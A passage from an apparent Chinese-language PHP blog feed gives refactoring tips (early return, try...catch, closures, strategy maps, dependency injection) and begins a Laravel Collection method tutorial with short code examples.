的过度依赖：</p><ol><li>提前 return：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ($input &gt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="comment">// do something </span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something else</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>只需要删除<code>else</code> 块，即可简化此过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ($input &gt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="comment">// do something </span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// do something else </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>switch...case</code> 也是不错地选择：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>($input)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"A"</span>:</span><br><span class="line">      <span class="comment">// do something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"B"</span>:</span><br><span class="line">      <span class="comment">// do else something</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用try…catch"><a href="#使用try…catch" class="headerlink" title="使用try…catch"></a>使用try…catch</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 用户不存在</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 密码错误</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// code...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $model = <span class="keyword">new</span> UserModel();</span><br><span class="line">        $res   = $model-&gt;login($username, $password);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($res === <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'code'</span> =&gt; <span class="string">'404'</span>,</span><br><span class="line">                <span class="string">'message'</span> =&gt; <span class="string">'用户不存在'</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($res === <span class="number">-2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'code'</span> =&gt; <span class="string">'400'</span>,</span><br><span class="line">                <span class="string">'message'</span> =&gt; <span class="string">'密码错误'</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// code...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>try...catch</code> 重写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 用户不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'用户不存在'</span>, <span class="string">'404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 密码错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'密码错误'</span>, <span class="string">'400'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $model = <span class="keyword">new</span> UserModel();</span><br><span class="line">            $res   = $model-&gt;login($username, $password);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果需要的话，我们可以在这里统一commit数据库事务</span></span><br><span class="line">            <span class="comment">// $db-&gt;commit();</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="comment">// 如果需要的话，我们可以在这里统一rollback数据库事务</span></span><br><span class="line">            <span class="comment">// $db-&gt;rollback();</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过使用<code>try...catch</code> 重写，使得代码逻辑职责分明、更加清晰。<code>try</code> 只用关心业务正常情况的处理，而所有异常则统一在<code>catch</code> 中处理，上游只需将异常抛出即可。</p><h2 id="使用匿名函数"><a href="#使用匿名函数" class="headerlink" title="使用匿名函数"></a>使用匿名函数</h2><p>需要在一个方法中，重复处理某个逻辑，这时可能会将其封装成一个函数，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个格式化代码的函数或方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 格式化代码段</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码并没有什么问题，但是如果这个函数仅仅只在<code>doSomething</code> 中使用呢？更好地做法应该是这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $format = <span class="function"><span class="keyword">function</span> <span class="params">(...)</span> <span class="title">use</span> <span class="params">(...)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 格式化代码段</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="简单的策略模式"><a href="#简单的策略模式" class="headerlink" title="简单的策略模式"></a>简单的策略模式</h2><p>客户端在做决策时，通常会根据不同的上下文环境选择不同的策略，可能会写成下面这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            $instance = <span class="keyword">new</span> A();</span><br><span class="line">        &#125;　<span class="keyword">elseif</span> (...) &#123;</span><br><span class="line">            $instance = <span class="keyword">new</span> B();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $instance = <span class="keyword">new</span> C();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $instance-&gt;doSomething(...);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这种情况，无论是使用<code>if...else</code>还是<code>switch...case</code> 当策略增多时，都会出现大量分支逻辑判断，好写的做法是定义一个简单的策略：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $map = [</span><br><span class="line">        <span class="string">'a'</span> =&gt; <span class="string">'namespace\A'</span>,</span><br><span class="line">        <span class="string">'b'</span> =&gt; <span class="string">'namespace\B'</span>,</span><br><span class="line">        <span class="string">'c'</span> =&gt; <span class="string">'namespace\C'</span></span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        $instance = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;map[$strategy];</span><br><span class="line">        $instance-&gt;doSomething(...);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;intance = <span class="keyword">new</span> Two();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 如果某种情况调用类Two的实例方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;instance-&gt;do(...);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">new</span> One();</span><br><span class="line">$instance-&gt;doSomething();</span><br></pre></td></tr></table></figure><p>上面这段代码有什么问题？</p><ol><li>不符合设计模式的最少知道原则，One 类内部直接依赖了Two 类。</li></ol><p>使用依赖注入重写此类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $closure;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Closure $closure)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;closure = $closure;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 用的时候再实例化</span></span><br><span class="line">            <span class="comment">// 实现懒加载</span></span><br><span class="line">            $instance = <span class="keyword">$this</span>-&gt;closure();</span><br><span class="line">            $instance-&gt;do(...)</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">new</span> One(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 从外部注入Two 类</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Two();</span><br><span class="line">&#125;);</span><br><span class="line">$instance-&gt;doSomething();</span><br></pre></td></tr></table></figure><h2 id="isset-语法糖"><a href="#isset-语法糖" class="headerlink" title="isset 语法糖"></a>isset 语法糖</h2><p><code>isset</code> 语法糖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$name = <span class="keyword">isset</span>($params[<span class="string">"name"</span>]) ? <span class="keyword">isset</span>($params[<span class="string">"name"</span>]) : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$name = <span class="keyword">isset</span>($params[<span class="string">"name"</span>]) ?: <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$name = $params[<span class="string">"name"</span>] ?? <span class="string">""</span>;</span><br></pre></td></tr></table></figure><h2 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h2><ul><li><a href="https://github.com/TIGERB/easy-tips/blob/master/php/artisan.md" target="_blank" rel="noopener">easy-tips/php</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Collection 基本使用</title>
      <link href="/basic-use-of-collection-in-laravel/"/>
      <url>/basic-use-of-collection-in-laravel/</url>
      
        <content type="html"><![CDATA[<p>集合是Laravel 中提供的最强大的功能之一，集合本质上是由功能强大的数组组成。</p><a id="more"></a><p>把类似数组的对象应用到方法中是很有用的，通过链式编程，用极短的代码，就可以达到预期的效果。</p><p>需要注意的是集合并不是Laravel 中独有的，许多语言都可以在数组中使用集合式编程，但非常遗憾，原生的PHP 是不支持集合式编程的，不过幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的包——<a href="https://github.com/illuminate/support" target="_blank" rel="noopener">illuminate/support</a>、<a href="https://github.com/tighten/collect" target="_blank" rel="noopener">Tightenco/Collect</a> 。</p><p>一般来说，集合是不可改变的，这意味着大部分 Collection 方法都会返回一个全新的 Collection 实例。</p><h2 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h2><p>为了创建一个集合，可以将一个数组传入集合的构造器中，也可以创建一个空的集合，然后把元素写到集合中。Laravel 有<code>collect()</code>助手，这是最简单的，新建集合的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>默认情况下， Eloquent 查询的结果返回的内容都是 <code>Illuminate\Support\Collection</code> 实例，如果希望对结果进行序列化，可以使用<code>toArray()</code>、<code>toJson()</code> 方法。</p></blockquote><p>在非Laravel 项目中使用集合：</p><p>安装：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> illuminate/support</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入package</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">var_dump($collection);</span><br></pre></td></tr></table></figure><p>记住，所有方法都可以使用链式编程的方式优雅的操纵数组。而且几乎所有的方法都会返回<strong>新的</strong> <code>Collection</code> 实例。</p><h2 id="方法列表"><a href="#方法列表" class="headerlink" title="方法列表"></a>方法列表</h2><h3 id="all"><a href="#all" class="headerlink" title="all"></a>all</h3><p>返回该集合表示的底层数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="string">"boo"</span>, <span class="string">"yumi"</span>, <span class="string">"mac"</span>])-&gt;all();</span><br><span class="line"><span class="comment">// [“boo”, "yumi", "mac"]</span></span><br></pre></td></tr></table></figure><h3 id="avg"><a href="#avg" class="headerlink" title="avg"></a>avg</h3><p>获取数组的平均值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>])-&gt;avg(); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>获取二维数组的平均值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([[<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">20</span>], [<span class="string">'foo'</span> =&gt; <span class="number">40</span>]])-&gt;avg(<span class="string">'foo'</span>); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure><h3 id="average"><a href="#average" class="headerlink" title="average"></a>average</h3><p><code>avg()</code>方法的别名，两者的效果是一样的。</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>将大集合按指定大小拆分成小集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]);</span><br><span class="line">$chunks = $collection-&gt;chunk(<span class="number">4</span>);</span><br><span class="line">$chunks-&gt;toArray();</span><br><span class="line"><span class="comment">// [[1, 2, 3, 4], [5, 6, 7]]</span></span><br></pre></td></tr></table></figure><h3 id="chunkWhile"><a href="#chunkWhile" class="headerlink" title="chunkWhile"></a>chunkWhile</h3><p>根据指定的回调值把集合分解成多个更小的集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect(str_split(<span class="string">'AABBCCCD'</span>));</span><br><span class="line"></span><br><span class="line">$chunks = $collection-&gt;chunkWhile(<span class="function"><span class="keyword">function</span> <span class="params">($current, $key, $chunk)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $current === $chunk-&gt;last();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$chunks-&gt;all();</span><br><span class="line"><span class="comment">// [['A', 'A'], ['B', 'B'], ['C', 'C', 'C'], ['D']]</span></span><br></pre></td></tr></table></figure><h3 id="collapse"><a href="#collapse" class="headerlink" title="collapse"></a>collapse</h3><p>将多个数组合并成一个集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]);</span><br><span class="line"><span class="comment">// 注意这里返回了一个新的集合</span></span><br><span class="line">$collapsed = $collection-&gt;collapse();</span><br><span class="line">$collapsed-&gt;all();</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><h3 id="combine"><a href="#combine" class="headerlink" title="combine"></a>combine</h3><p>将一个集合的值作为「键」，再将另一个数组或者集合的值作为「值」合并成一个集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span>, <span class="string">'age'</span>]);</span><br><span class="line">$combined = $collection-&gt;combine([<span class="string">'boo'</span>, <span class="number">25</span>]);</span><br><span class="line">$combined-&gt;all();</span><br><span class="line"><span class="comment">// ['name' =&gt; 'boo', 'age' =&gt; 25]</span></span><br></pre></td></tr></table></figure><h3 id="collect"><a href="#collect" class="headerlink" title="collect"></a>collect</h3><p>返回一个包含当前集合所含元素的新的 Collection 实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">$collection-&gt;all(); </span><br><span class="line"><span class="comment">// [1,2,3]</span></span><br></pre></td></tr></table></figure><h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><p>追加给定数组或集合数据到集合末尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'John Doe'</span>]);</span><br><span class="line">$concatenated = $collection-&gt;concat([<span class="string">'Boo'</span>])-&gt;concat([<span class="string">'name'</span> =&gt; <span class="string">'Yumi'</span>]);</span><br><span class="line">$concatenated-&gt;all();</span><br><span class="line"><span class="comment">// ['John Doe', 'Boo', 'Yumi']</span></span><br></pre></td></tr></table></figure><h3 id="contains"><a href="#contains" class="headerlink" title="contains"></a>contains</h3><p>判断集合是否包含给定的项目。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'boo'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;contains(<span class="string">'boo'</span>);  <span class="comment">// true</span></span><br><span class="line">$collection-&gt;contains(<span class="string">'yumi'</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>也可以用 contains 方法匹配一对键/值，即判断给定的配对是否存在于集合中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 